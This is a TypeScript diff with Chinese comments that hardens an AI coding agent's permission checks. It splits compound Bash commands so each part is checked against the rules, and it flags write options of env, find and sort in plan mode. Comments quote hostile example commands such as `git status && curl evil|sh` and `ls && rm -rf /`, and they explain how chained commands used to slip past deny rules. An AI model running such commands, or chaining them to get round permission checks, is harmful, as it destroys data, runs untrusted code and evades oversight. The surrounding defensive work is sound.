@@ -58,7 +58,8 @@ export function parseRuleset(raw: Ruleset, side: keyof Ruleset): PermissionRule[
   });
 }
 
-/** specifier 匹配：Bash 对命令串整串 glob（`*` 跨空格，[CC] "git *" 前缀语义）；路径类对 file_path/path glob（`**` 跨目录）。 */
+/** specifier 匹配：Bash 对命令串整串 glob（`*` 跨空格，[CC] "git *" 前缀语义；复合命令由 evaluate 先分段
+ *  ——S3-1，本函数只对单段/整串主题判定）；路径类对 file_path/path glob（`**` 跨目录）。 */
 export function ruleMatches(rule: PermissionRule, toolName: string, input: unknown): boolean {
   if (!toolMatches(rule.tool, toolName)) return false;
   if (rule.specifier === null) return true;
@@ -112,21 +113,101 @@ function segRegex(seg: string, crossAny: boolean): RegExp {
   return new RegExp(re + "$");
 }
 
+/**
+ * S3-1（全仓审查 2026-10-01；规格 §8.3「复合 Bash 逐段检查防前缀伪装」）：Bash 命令分段——
+ * 按未引号态的 `|| && ; | & \n` 切（与 isMutatingBash 同符集，但引号/转义内不切：`echo "a && b"` 为单段）。
+ * 返回含引号原文的段（不 trim，供 glob 用原文匹配）。
+ */
+export function splitBashSegments(command: string): string[] {
+  const segments: string[] = [];
+  let cur = "";
+  let quote: string | null = null;
+  let i = 0;
+  while (i < command.length) {
+    const ch = command[i]!;
+    if (quote !== null) {
+      if (ch === "\\" && quote === '"' && i + 1 < command.length) {
+        cur += ch + command[i + 1]!;
+        i += 2;
+        continue;
+      }
+      if (ch === quote) quote = null;
+      cur += ch;
+      i++;
+      continue;
+    }
+    if (ch === "'" || ch === '"') {
+      quote = ch;
+      cur += ch;
+      i++;
+      continue;
+    }
+    if (ch === "\\" && i + 1 < command.length) {
+      cur += ch + command[i + 1]!;
+      i += 2;
+      continue;
+    }
+    if (ch === "\n") {
+      segments.push(cur);
+      cur = "";
+      i++;
+      continue;
+    }
+    if (ch === "&" || ch === ";" || ch === "|") {
+      if (ch !== ";" && command[i + 1] === ch) {
+        segments.push(cur);
+        cur = "";
+        i += 2;
+        continue;
+      }
+      segments.push(cur);
+      cur = "";
+      i++;
+      continue;
+    }
+    cur += ch;
+    i++;
+  }
+  segments.push(cur);
+  return segments;
+}
+
+/** 规则评估用 Bash 主题集：>1 个非空段=逐段（S3-1），否则回落整串原文（非复合命令保持原语义）。 */
+function bashSubjects(command: string): string[] {
+  const segs = splitBashSegments(command)
+    .map((s) => s.trim())
+    .filter((s) => s !== "");
+  return segs.length > 1 ? segs : [command];
+}
+
 // —— Plan 模式改文件类 Bash 拦截（§8.3 L381：[CC] 2.1.212 漏洞回归；fail-closed 启发式 [自定]）——
 
-/** 只读命令白名单：白名单外一律视为可变更（fail-closed）。git 仅 status/log/diff/show/blame 视为只读。 */
+/** 只读命令白名单：白名单外一律视为可变更（fail-closed）。git 仅 status/log/diff/show/blame 视为只读。
+ *  S3-3（全仓审查 2026-10-01）：`env` 移出白名单改走前缀穿透（见 isMutatingBash 内 env 循环）——
+ *  留白名单会因 stripQuoted 吞掉 `env bash -c "echo x > f"` 内层重定向而 fail-open；find/sort 保留
+ *  白名单但须过写面旗标检查（下两枚正则）。 */
 const READONLY_COMMANDS: ReadonlySet<string> = new Set([
   "ls", "pwd", "cat", "head", "tail", "wc", "grep", "rg", "find", "which", "where", "whereis", "file", "stat", "du", "df",
-  "ps", "env", "printenv", "whoami", "hostname", "uname", "date", "id", "tree", "sort", "uniq", "cut", "tr",
+  "ps", "printenv", "whoami", "hostname", "uname", "date", "id", "tree", "sort", "uniq", "cut", "tr",
   "diff", "comm", "jq", "man", "echo", "printf", "test", "true", "false", "type", "tasklist", "dir",
 ]);
+
+/** S3-3 find 写面旗标（-exec/-execdir/-ok/-okdir/-delete/-fls/-fprint/-fprint0/-fprintf）——
+ *  对原串带引号边界匹配（`"-delete"` 引号形同命中，stripQuoted 吞不掉）；fail-closed 方向：误报只多拦。 */
+const FIND_WRITE_FLAGS_RE = /(?:^|[\s"'`])(?:-{1,2}exec(?:dir)?|-{1,2}ok(?:dir)?|-delete|-fls|-{1,2}fprintf|-{1,2}fprint0?)(?=[\s"'`]|$)/;
+/** S3-3 sort 写面旗标（-o/--output 全形：附着 `-oFILE`、组合 `-ro`、`--o` 缩写与 `--output=`）——
+ *  单横线短旗标簇含 `o` 即命中（sort 短旗标仅 -o 含 o；簇后为附着值故匹配到 o 即止），fail-closed 方向。 */
+const SORT_OUTPUT_FLAGS_RE = /(?:^|[\s"'`])(?:--o[A-Za-z]*|-[A-Za-z]*o)/;
 
 /** 包装器/提权前缀一律视为可变更（[CC] 包装器穿透集合的 fail-closed 反向：不可静态证明只读即拦）。 */
 const WRAPPER_COMMANDS: ReadonlySet<string> = new Set(["sudo", "doas", "xargs", "exec", "nohup", "timeout", "nice", "watch", "eval", "source", "."]);
 
 const GIT_READONLY_SUBCOMMANDS: ReadonlySet<string> = new Set(["status", "log", "diff", "show", "blame"]);
 
-/** Plan 模式 Bash 可变更性判定（启发式，fail-closed）：重定向/命令替换/管道段首词白名单外/包装器 → 可变更。 */
+/** Plan 模式 Bash 可变更性判定（启发式，fail-closed）：重定向/命令替换/管道段首词白名单外/包装器 → 可变更。
+ *  S3-3（全仓审查 2026-10-01）：①env 走前缀穿透——跳过 env 旗标/赋值取真正被启动的命令重新判定，
+ *  不可静态证明只读即拦（`env bash -c "…"` 内层 bash 非白名单 → 可变更；`env ls` 穿透后仍只读）；
+ *  ②find/sort 写面旗标对**原串**查（stripQuoted 吞引号形，`"-delete"`/`"-o"` 亦命中）。 */
 export function isMutatingBash(command: string): boolean {
   const stripped = stripQuoted(command);
   // 分段符含单 `&`（后台操作符）——`echo hi & rm -rf x` 的第二段必须独立受检（V 退回①：[CC] 2.1.212 回归面）
@@ -137,8 +218,20 @@ export function isMutatingBash(command: string): boolean {
     if (seg.includes("$(") || seg.includes("`")) return true; // 命令替换不透明，fail-closed
     const tokens = seg.split(/\s+/).filter(Boolean);
     let idx = 0;
-    while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!)) idx++; // 剥离 env 赋值
-    const head = (tokens[idx] ?? "").toLowerCase();
+    const skipAssign = () => {
+      while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!)) idx++;
+    };
+    skipAssign(); // 剥离 env 赋值
+    let head = (tokens[idx] ?? "").toLowerCase();
+    while (head === "env") {
+      // env 前缀穿透（S3-3；sanitize.ts WRAPPER_PREFIXES 同款 unwrap 语义，判定方向 fail-closed）：
+      // 跳过 env 自身旗标（-i/-u NAME/--unset=…/…）与赋值，取真正被启动的命令做首词判定；
+      // 旗标值形如 `-u NAME` 的 NAME 会误当首词（非白名单 → 可变更）——保守多拦，可接受。
+      idx++;
+      while (idx < tokens.length && (tokens[idx]!.startsWith("-") || /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!))) idx++;
+      skipAssign();
+      head = (tokens[idx] ?? "").toLowerCase();
+    }
     if (head === "") continue;
     if (head === "git") {
       const sub = (tokens[idx + 1] ?? "").toLowerCase();
@@ -147,6 +240,8 @@ export function isMutatingBash(command: string): boolean {
     }
     if (WRAPPER_COMMANDS.has(head)) return true;
     if (head === "sed" && tokens.some((t) => /^-[^-]*[iw]/.test(t) || t === "--in-place")) return true;
+    if (head === "find" && FIND_WRITE_FLAGS_RE.test(command)) return true;
+    if (head === "sort" && SORT_OUTPUT_FLAGS_RE.test(command)) return true;
     if (!READONLY_COMMANDS.has(head)) return true;
   }
   return false;
@@ -228,18 +323,28 @@ function buildBroker(
       return raw;
     },
     evaluate: (toolName, input) => {
+      // S3-1（规格 §8.3「复合 Bash 逐段检查防前缀伪装」）：Bash 复合命令逐段受检——deny/ask=任一段命中
+      // 即中（`ls && rm -rf /` 不再绕过 deny `Bash(rm *)`），allow=**每段**都被某条 allow 规则覆盖
+      // （`Bash(git *)` 不再整串 glob 放行 `git status && curl evil|sh`）；单段命令/非 Bash 回落整串原语义。
+      const subjects: unknown[] =
+        toolName === "Bash" && typeof (input as Record<string, unknown> | null)?.command === "string"
+          ? bashSubjects((input as { command: string }).command).map((command) => ({ command }))
+          : [input];
+      const segHit = (r: PermissionRule) => subjects.some((sub) => ruleMatches(r, toolName, sub));
       for (const r of deny) {
-        if (ruleMatches(r, toolName, input)) return { decision: "deny", reason: `deny rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
+        if (segHit(r)) return { decision: "deny", reason: `deny rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
       }
       if (mode === "plan" && isMutatingTool(toolName, input)) {
         return { decision: "deny", reason: `plan mode blocks file-mutating ${toolName}` };
       }
       for (const r of ask) {
-        if (ruleMatches(r, toolName, input)) return { decision: "ask", reason: `ask rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
+        if (segHit(r)) return { decision: "ask", reason: `ask rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
       }
-      for (const r of allow) {
-        if (ruleMatches(r, toolName, input)) return { decision: "allow", reason: `allow rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
-      }
+      const allowHit =
+        subjects.length > 0 && subjects.every((sub) => allow.some((r) => ruleMatches(r, toolName, sub)))
+          ? allow.find((r) => ruleMatches(r, toolName, subjects[0]!))
+          : undefined;
+      if (allowHit) return { decision: "allow", reason: `allow rule: ${allowHit.tool}${allowHit.specifier ? `(${allowHit.specifier})` : ""}` };
       switch (mode) {
         case "bypassPermissions":
           return { decision: "allow", reason: "mode: bypassPermissions (Auto)" };
